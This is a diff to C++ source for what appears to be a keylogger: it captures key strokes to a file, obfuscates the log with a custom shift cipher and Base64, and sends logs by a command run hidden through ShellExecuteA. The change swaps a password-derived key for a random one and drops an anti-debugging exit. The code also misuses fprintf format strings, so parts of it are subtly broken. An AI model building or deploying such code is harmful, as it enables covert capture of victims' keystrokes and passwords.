@@ -1,17 +1,35 @@
 #include "common.h"
 
+#pragma warning( push )
+#pragma warning( disable : 6284 )
+#pragma warning( disable : 6387 )
 std::set<DWORD> getAllThreadIds();
 template <class InputIterator> HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest);
 FILE* OUTPUT_FILE;
 
 std::string Log::EncryptMyString(std::string UnencryptedString) {
-#ifndef debug
-    std::string CryptedString;
-    for (int r = 0; r < UnencryptedString.size(); r++) {
-        CryptedString += UnencryptedString[r] + ExtrapolatedKey;
+    if (CryptLogs) {
+        std::string CryptedString;
+        std::string ThrowAwayKey;
+        ThrowAwayKey += (char)(rand() % KeyShiftLimit + 1);
+        for (int r = 0; r < UnencryptedString.size(); r++) {
+            if ((int)ThrowAwayKey[0] % 2 == 0) {
+                if (UnencryptedString[r] % 2 == 0)
+                    CryptedString += UnencryptedString[r] + (int)ThrowAwayKey[0] + 2;
+                else
+                    CryptedString += UnencryptedString[r] + (int)ThrowAwayKey[0] + 4;
+            }
+            else {
+                if (UnencryptedString[r] % 2 == 0)
+                    CryptedString += UnencryptedString[r] + (int)ThrowAwayKey[0] + 1;
+                else
+                    CryptedString += UnencryptedString[r] + (int)ThrowAwayKey[0] + 3;
+            }
+        }
+        UnencryptedString = CryptedString;
+        Base64::encode(ThrowAwayKey, &CryptedString);
+        UnencryptedString += CryptedString + ';';
     }
-    UnencryptedString = CryptedString;
-#endif
     return UnencryptedString;
 }
 
@@ -59,21 +77,18 @@ void Log::LogItInt(int key_stroke) {
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
     else if (key_stroke == 190 || key_stroke == 110)
         fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
-    else
-#ifndef debug
-        key_stroke += ExtrapolatedKey;
-#endif
-    fprintf(OUTPUT_FILE, "%s", &key_stroke);
+    else {
+        if (CryptLogs) {
+            fprintf(OUTPUT_FILE, "%s", EncryptMyString(std::to_string(key_stroke)));
+            fprintf(OUTPUT_FILE, "%s", ';');
+        }
+        else
+            fprintf(OUTPUT_FILE, "%s", &key_stroke);
+    }
     fclose(OUTPUT_FILE);
 }
 
 void Log::LogItChar(std::string Value) {
-#ifndef debug
-    if (IsDebuggerPresent()) {
-        FinalExit();
-    }
-
-#endif
 
     Value += "\n";
 
@@ -166,20 +181,6 @@ void Log::SendLog() {
         //system(Command.c_str());
         ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
     }
-}
-
-
-
-
-int Log::ExtrapolateKey() {
-
-    std::string Passwd = CryptPassword;
-    int ExtrapolatedKey1 = BaseShiftValue;
-    for (int plq = 0; plq < Passwd.size(); plq++) {
-        ExtrapolatedKey1 += (int)Passwd[plq];
-    }
-    ExtrapolatedKey = ExtrapolatedKey1;
-    return ExtrapolatedKey1;
 }
 
 void Log::CreateLog() {
@@ -286,3 +287,5 @@ HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR 
     }
     return hr;
 }
+
+#pragma warning( pop )
